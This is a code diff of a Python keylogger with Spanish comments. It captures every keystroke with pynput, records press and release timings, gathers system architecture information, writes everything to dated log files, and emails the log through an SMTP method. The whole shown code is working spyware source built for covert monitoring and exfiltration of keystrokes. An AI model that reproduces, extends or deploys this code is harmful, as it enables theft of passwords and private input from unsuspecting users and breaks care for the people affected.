@@ -10,10 +10,21 @@ import report
 import os
 import sys
 import fileinput
+import timing
 
-log=""
+
+
+log =""
+
 #Clase keylogger
 class Keylogger:
+    captcha=""
+    keyword=""
+    inicio=""
+    fin=""
+    txt=report.report("reporte_timing.txt")
+    count=0
+
     z = datetime.now()
     m = "keylogger_fecha_{}.txt".format(z.strftime("%d-%m-%Y_%H-%M-%S"))
     #inicializando valores
@@ -28,14 +39,18 @@ class Keylogger:
         self.log=self.log + string
     #leyendo el ingreso
     def process_key_press(self, key):
+        self.pressKey(key)
         try:
             current_key = str(key.char)
+            self.keyword = current_key
         except AttributeError:
             if key == key.space:
                 current_key = " "
             else:
                 current_key= " " + str(key) + " " 
+        self.leaveKey(key)
         self.append_to_log(current_key)
+        return current_key
 
     #generando reporte y enviando el archivo al correo
     def report(self):
@@ -53,8 +68,9 @@ class Keylogger:
         archivo.write(captexto)
         archivo.close()
         contador.ContarTxt(self.m)
-        arq = report.report("arquitectura.txt")
-        arq.arch()
+        arq = report.report("arquitectura.txt") #Se crea el txt
+        arq.arch()                              #se capta el comando para llenar arquitectura.txt
+        #Se empieza a eliminar caracteres no legibles para enviar correo
         cts1 = "@"
         cts2 = "«"
         cts3 = "»"
@@ -86,7 +102,7 @@ class Keylogger:
         filedata = filedata.replace("ú","u")
         with open(ftS,"w") as file:
             file.write(filedata)
-        
+        #se termina de eliminar caracteres no legibles para enviar correo
         archivo = open("arquitectura.txt","r")
         cad = archivo.read()
         archivo.close()        
@@ -102,21 +118,28 @@ class Keylogger:
         archivo = open(self.m,"a")
         archivo.write(cadenita)
         archivo.close()
+        """ archivo = open("reporte_timing.txt","r")
+        cad = archivo.read()
+        archivo.close()
+        archivo = open(self.m, "a")
+        archivo.write('***************************Reporte Time Key***************************''\n'+cad+'\n')
+        archivo.close() """
 
-    #envía el email
-    '''def send_mail(self, email, password, message):
-        server = smtplib.SMTP("smtp.gmail.com", 587)
-        server.starttls()
-        server.login(email, password)
-        server.sendmail(email, email, message)
-        server.quit()
-    '''
     #inicia el proceso
-    def start(self):
+    def start(self ):
         keyboard_listener = pynput.keyboard.Listener(on_press=self.process_key_press)
         with keyboard_listener:
             self.report()
             keyboard_listener.join()
+       
+    
+    """ def start(self,repoTiming):
+        self.txt=repoTiming
+        keyboard_listener = pynput.keyboard.Listener(self.pressKey, self.leaveKey, self.process_key_press)
+        with keyboard_listener:
+            self.report()
+            keyboard_listener.join() """
+  
     
     #envia el txt al correo
     def sendmailwithtxt(self, email, password):
@@ -134,3 +157,19 @@ class Keylogger:
         
         smtp.sendmail(email, email, mensaje.as_string())
         smtp.quit()
+
+    #timing
+    def pressRecord(self,rt):
+        self.captcha=self.keyword+"\t\t\t"+self.inicio+"\t\t"+self.fin
+        rt.timing(self.captcha,rt.setName())
+        self.captcha=""
+
+    def pressKey(self, key):
+        if self.count==0:
+            self.inicio=str(datetime.today())
+        self.count=self.count+1
+
+    def leaveKey(self, key):
+        self.fin=str(datetime.today())
+        self.pressRecord(self.txt)
+        self.count=0
